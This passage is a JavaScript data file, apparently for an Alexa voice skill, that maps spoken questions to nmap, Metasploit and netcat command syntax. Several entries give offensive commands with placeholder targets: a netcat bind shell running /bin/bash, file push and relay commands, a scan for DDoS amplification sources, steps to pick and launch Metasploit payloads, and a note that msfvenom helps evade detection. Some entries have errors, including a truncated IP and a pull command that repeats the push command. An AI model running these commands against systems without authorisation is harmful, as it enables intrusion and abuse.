	"OS fingerprint scan": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"OS and service fingerprint scan": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"OS and service fingerprint": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"OS and service fingerprinting": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"do OS and service fingerprint": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"do fingerprint scan": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	"do an OS fingerprint scan": {"speech" : "n map space dash upper-case A space 192.168.1.1", "card" : "nmap -A 192.168.1.1"},
	// service detection
	"standard service detection": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"service detection": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"service scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"service": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"services": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"for services": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"do a service detection scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"do a service detect": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"do a service detect scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"do service fingerprint scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"do a service fingerprint scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"service fingerprint scan": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"scan for services": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	"scan and fingerprint services": {"speech" : "n map space dash s upper-case V space 192.168.1.1", "card" : "nmap -sV 192.168.1.1"},
	// aggressive service detect
	"aggressive service detection": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service detection": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service fingerprint": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"noisy service fingerprinting": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do a noisy service fingerprint": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do a noisy service scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detection scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detect": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service fingerprint": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service detect scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do an aggressive service fingerprint scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"do aggressive service fingerprinting": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"scan aggressively for services": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	"scan aggressive and fingerprint services": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 5 space 192.168.1.1", "card" : "nmap -sV --version-intensity 5 192.168.1.1"},
	// light service detection
	"light service detection": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service detection": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"light service detection scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service detection scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"quiet service detection": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"quiet service detection scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"light service scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	"stealthy service scan": {"speech" : "n map space dash s upper-case V space dash dash version dash intensity space 0 space 192.168.1.1", "card" : "nmap -sV --version-intensity 0 192.168.1.1"},
	// tcp connect full
	"scan using tcp connect": {"speech" : "n map space dash s upper-case T space 192.168.1.1", "card" : "nmap -sT 192.168.1.1"},
	"scan using full tcp connect": {"speech" : "n map space dash s upper-case T space 192.168.1.1", "card" : "nmap -sT 192.168.1.1"},
	"tcp connect scan": {"speech" : "n map space dash s upper-case T space 192.168.1.1", "card" : "nmap -sT 192.168.1.1"},
	"full tcp connect scan": {"speech" : "n map space dash s upper-case T space 192.168.1.1", "card" : "nmap -sT 192.168.1.1"},
	"full connect scan": {"speech" : "n map space dash s upper-case T space 192.168.1.1", "card" : "nmap -sT 192.168.1.1"},
	// syn
	"scan using syn": {"speech" : "n map space dash s upper-case S space 192.168.1.1", "card" : "nmap -sS 192.168.1.1"},
	"do a syn scan": {"speech" : "n map space dash s upper-case S space 192.168.1.1", "card" : "nmap -sS 192.168.1.1"},
	"syn": {"speech" : "n map space dash s upper-case S space 192.168.1", "card" : "nmap -sS 192.168.1.1"},
	"syn scan": {"speech" : "n map space dash s upper-case S space 192.168.1.1", "card" : "nmap -sS 192.168.1.1"},
	"scan using tcp syn": {"speech" : "n map space dash s upper-case S space 192.168.1.1", "card" : "nmap -sS 192.168.1.1"},
	// find UDP
	"scan udp ports": {"speech" : "n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"find udp ports": {"speech" : "n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan for udp ports": {"speech" : "n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	"scan using udp": {"speech" : "n map space dash s upper-case U space dash p space 123 comma 1 6 1 comma 1 6 2 space 192.168.1.1", "card" : "nmap -sU -p 123,161,162 192.168.1.1"},
	// ignore discovery
	"scan ignoring discovery": {"speech" : "n map space dash upper-case P n space dash upper-case F space 192.168.1.1", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan ports ignoring discovery": {"speech" : "n map space dash upper-case P n space dash upper-case F space 192.168.1.1", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan while ignoring discovery": {"speech" : "n map space dash upper-case P n space dash upper-case F space 192.168.1.1", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan through firewall": {"speech" : "n map space dash upper-case P n space dash upper-case F space 192.168.1.1", "card" : "nmap -Pn -F 192.168.1.1"},
	"scan without waiting for a response": {"speech" : "n map space dash upper-case P n space dash upper-case F space 192.168.1.1", "card" : "nmap -Pn -F 192.168.1.1"},
	// all ports
	"scan all ports": {"speech" : "n map space dash p space dash space 192.168.1.1", "card" : "nmap -p - 192.168.1.1"},
	"all ports": {"speech" : "n map space dash p space dash space 192.168.1.1", "card" : "nmap -p - 192.168.1.1"},
	"scan every port": {"speech" : "n map space dash p space dash space 192.168.1.1", "card" : "nmap -p - 192.168.1.1"},
	// scan top 100
	"quick scan": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"do a quick": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"do a fast scan": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"fast scan": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan fast": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan top 100 ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan top 100 most common ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan 100 common ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan common ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan most common ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	"scan 100 most common ports": {"speech" : "n map space dash F space 192.168.1.1", "card" : "nmap -F 192.168.1.1"},
	// scan a range of ports
	"scan range of ports": {"speech" : "n map space dash p space 1 dash 100 space 192.168.1.1", "card" : "nmap -p 1-100 192.168.1.1"},
	"scan a range of ports": {"speech" : "n map space dash p space 1 dash 100 space 192.168.1.1", "card" : "nmap -p 1-100 192.168.1.1"},
	"scan a sequence of ports": {"speech" : "n map space dash p space 1 dash 100 space 192.168.1.1", "card" : "nmap -p 1-100 192.168.1.1"},
	// scan single port
	"scan single port": {"speech" : "n map space dash p space 22 space 192.168.1.1", "card" : "nmap -p 22 192.168.1.1"},
	"scan just one port": {"speech" : "n map space dash p space 22 space 192.168.1.1", "card" : "nmap -p 22 192.168.1.1"},	
	"scan one port": {"speech" : "n map space dash p space 22 space 192.168.1.1", "card" : "nmap -p 22 192.168.1.1"},	
	"scan a port": {"speech" : "n map space dash p space 22 space 192.168.1.1", "card" : "nmap -p 22 192.168.1.1"},
	"scan a single port": {"speech" : "n map space dash p space 22 space 192.168.1.1", "card" : "nmap -p 22 192.168.1.1"},
	// scan 1 ip
	"scan just one ip address": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},	
	"scan just one ip": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},	
	"scan one ip": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},	
	"scan an ip address": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},	
	"scan an ip": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},	
	"scan a single ip": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},
	"scan just a single ip": {"speech" : "n map space 192.168.1.1", "card" : "nmap 192.168.1.1"},
	// fqdn	
	"scan a host": {"speech" : "nmap space www dot your host to scan dot com", "card" : "nmap www.yourhosttoscan.com"},
	"scan a domain name": {"speech" : "nmap www dot your host to scan dot com", "card" : "nmap www.yourhosttoscan.com"},
	"scan a fqdn": {"speech" : "nmap space www dot your host to scan dot com", "card" : "nmap www.yourhosttoscan.com"},
	// scan ip range
	"scan a sequence of ip addresses": {"speech" : "To scan 20 IP addresses, at the command prompt enter n map space 192.168.1.1 dash 20", "card" : "nmap 192.168.1.1-20"},
	"scan a sequence of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter n map space 192.168.1.1 dash 20", "card" : "nmap 192.168.1.1-20"},
	"scan a range of ips": {"speech" : "To scan 20 IP addresses, at the command prompt enter n map space 192.168.1.1 dash 20", "card" : "nmap 192.168.1.1-20"},
	"scan a range of ip addresses": {"speech" : "To scan 20 IP addresses, at the command prompt enter n map space 192.168.1.1 dash 20", "card" : "nmap 192.168.1.1-20"},
	// subnet scan
	"scan a network segment": {"speech" : "n map space 192.168.1.0 forward slash 24", "card" : "nmap 192.168.1.0/24"},
	"scan a network": {"speech" : "n map space 192.168.1.0 forward slash 24", "card" : "nmap 192.168.1.0/24"},
	"scan a subnet": {"speech" : "n map space 192.168.1.0 forward slash 24", "card" : "nmap 192.168.1.0/24"},
	"a subnet": {"speech" : "n map space 192.168.1.0 forward slash 24", "card" : "nmap 192.168.1.0/24"},
	"do a subnet scan": {"speech" : "n map space 192.168.1.0 forward slash 24", "card" : "nmap 192.168.1.0/24"},
	// targets from a file
	"scan targets from a file": {"speech" : "n map space dash i upper-case L space your file dot T X T", "card" : "nmap -iL your-file-of-ips.txt"},
	"load scan targets from a file": {"speech" : "n map space dash i upper-case L space your file dot T X T", "card" : "nmap -iL your-file-of-ips.txt"},
	"scan ip addresses from a file":  {"speech" : "n map space dash i upper-case L space your file dot T X T", "card" : "nmap -iL your-file-of-ips.txt"},
	// ddos
	"scan for ddos targets": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"do a ddos scan": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for ddos": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"look for ddos targets": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan for ddos": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan ddos targets": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"},
	"scan ddos vulnerable systems": {"speech" : "Please see the output of the Alexa phone app for the syntax.", "card" : "nmap –sU –A –PN –n –pU:19,53,123,161 –script=ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24"}
} };

const metasploit = { "METASPLOIT_EN_US": {
	"get help": {"speech": "At the MSF console prompt enter question mark or the word help.", "card" : "msf> ?"},
	"quit": {"speech" : "At the MSF console prompt type exit or quit. If you enter the word shutdown or reboot the system itself will restart.", "card" : "msf> exit" },
	"exit": {"speech" : "At the MSF console prompt type exit or quit. If you enter the word shutdown or reboot the system itself will restart.", "card" : "msf> quit"},
	"search exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"search exploits": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"tell what exploits are available": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"find exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"find exploits": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"find what exploits are available": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"search for an exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"find an exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"select an exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"select the exploit": {"speech" : "At the MSF console prompt enter search followed by a regular expression or partial exploit name.","card" : "Example of a metasploit search \\ msf> search Apache or msf> search Windows 7"},
	"specify exploit": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify an exploit": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify the exploit": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.","card" : "msf> use payload \\path\\to\\payload"},
	"specify payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"specify a payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"specify the payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"set a payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"set the payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"pick a payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"pick the payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"select a payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"select the payload": {"speech" : "At the MSF console prompt enter use payload followed by the path to the payload.", "card" : "msf> use payload \\path\\to\\payload"},
	"view module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"view a modules options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"see what options a module has": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"view what options a module has": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"show module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"show a modules options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"get module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"get a modules options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"find out what options a module has": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"display the modules options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"display module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"display a modules options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"find module options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"find options": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"determine what options are available": {"speech" : "At the MSF console prompt enter show options.","card" : "Example of show module options \\ msf> show options"},
	"start exploiting": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"begin exploiting": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"start the exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"start the hack": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"begin the exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"initiate the exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"initiate an exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"begin an exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"start an exploit": {"speech" : "At the MSF console prompt enter exploit.","card" : "Example of show module options \\ msf> exploit"},
	"meterpreter": {"speech" : "Meterpreter is a metasploit payload that runs as a DLL in a process on the target machine. It has many options for pillaging and pivoting.","card" : "Meterpreter is a metasploit payload that runs as a DLL in a process on the target machine. It has many options for pillaging and pivoting."},
	"msf venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"m. s. f. venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"venom": {"speech" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection.","card" : "MSF Venom is a component of Metasploit that helps create stand-alone payloads in raw shell code or script or executable. Venom can encode the payload to help avoid detection."},	
	"set params" : {"speech" : "At the MSF console prompt enter set followed by a space then the name of the option followed by a space and then the value you wish to set.", "card" : "msf> set optionname value"}
} };

const netcat = { "NETCAT_EN_US": {
	"shell": { "speech": "To start a Netcat shell. At the command prompt, type NC dash L dash P followed by the port number you want to listen on.", "card": "nc -l -p [LocalPort] -e /bin/bash"},
	"transfer file": { "speech": "To transfer a file by NetCat, at the command prompt type NC dash L dash P  followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects.", "card": "nc -l -p [LocalPort] > [outfile]"},
	"transfer a file": { "speech": "To transfer a file by NetCat, at the command prompt type NC dash L dash P  followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects.", "card": "nc -l -p [LocalPort] > [outfile]"},
	"file transfer": { "speech": "To transfer a file by NetCat, at the command prompt type NC dash L dash P  followed by a space and the port you want to listen on. Follow that with a space and a greater-than symbol, another space and the file-name you wish to push when a remote user connects.", "card": "nc -l -p [LocalPort] > [outfile]"},
	"proxy" : {"speech": "The syntax for this one is more difficult. You can create a net-cat proxy by following the syntax shown in the Alexa app.", "card": "To Start, create a FIFO named pipe. At the command prompt: cd /tmp [enter] mknod backpipe p [enter] nc -l -p [LocalPort] 0<backpipe | nc [TargetIPAddr] [port] | tee backpipe"},
	"connect" : {"speech": "at the command prompt type NC followed by a space then your target IP address. After another space enter the port number you wish to connect to.", "card": "nc [TargetIPAddress] [Port]"},
	"client" : {"speech": "at the command prompt type NC followed by a space then your target IP address. After another space enter the port number you wish to connect to.", "card": "nc [TargetIPAddress] [Port]"},
	"simple client" : {"speech": "at the command prompt type NC followed by a space then your target IP address. After another space enter the port number you wish to connect to.", "card": "nc [TargetIPAddress] [Port]"},
    "listener": { "speech": "To create a NetCat Listener, at the command prompt type NC dash lower-case l space dash P followed by a space and the port you want to listen on. Use an upper-case L to continue listening.", "card": "nc -l -p [LocalPort] //Or you can use// nc -L -p [LocalPort] //to stay in listening mode."},
    "file push": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "file pull": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "file pusher": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "file puller": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "file sender": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "file retriever": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "push a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "pull a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "send a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "get a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "retrieve a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "upload a file": { "speech": "To create a NetCat file-pushing client, at the command prompt type NC space dash W 3 space followed by the Target IP Address followed by a space followed by the port followed by a Less Than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "download a file": { "speech": "To create a NetCat file-pulling client, at the command prompt type NC space dash L space dash P followed by a space followed by the less-than symbol followed by a space and the name of the file being uploaded.", "card": "nc -w3 [TargetIPAddr] [LocalPort] < [infile]"},
    "make a port scanner": { "speech": "To create a NetCat port scanner, at the command prompt type NC space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number.", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
    "start a port scan": { "speech": "To create a NetCat port scanner, at the command prompt type NC space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number.", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
    "create a port scanner": { "speech": "To create a NetCat port scanner, at the command prompt type NC space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number.", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
    "do a port scan": { "speech": "To create a NetCat port scanner, at the command prompt type NC space dash V space dash n space dash z space dash W 1 space target-IP-address space starting port number space followed by the ending port number.", "card": "nc -v -n -z -w1 [TargetIPAddr] [start_port] [end_port] (you can use -r to randomize ports, and for Windows be sure to use -vv instead of -v)"},
    "options": { "speech": "command flags are: dash l is listen, dash upper-case L is listen harder. Dash u is UDP mode. Dash p is port. Dash e is program to run after a connection. Dash n to avoid DNS lookups. Dash z to not send data. Dash w wait. Dash v or vv for verbosity.", "card": "command flags are:\\ -l is listen \\ -L is listen harder. \\ -u is UDP mode. \\ -p is port. \\ -e is program to run after a connection. \\ -n to avoid DNS lookups. \\ -z to not send data \\ -w wait \\ -v or -vv for verbosity."},
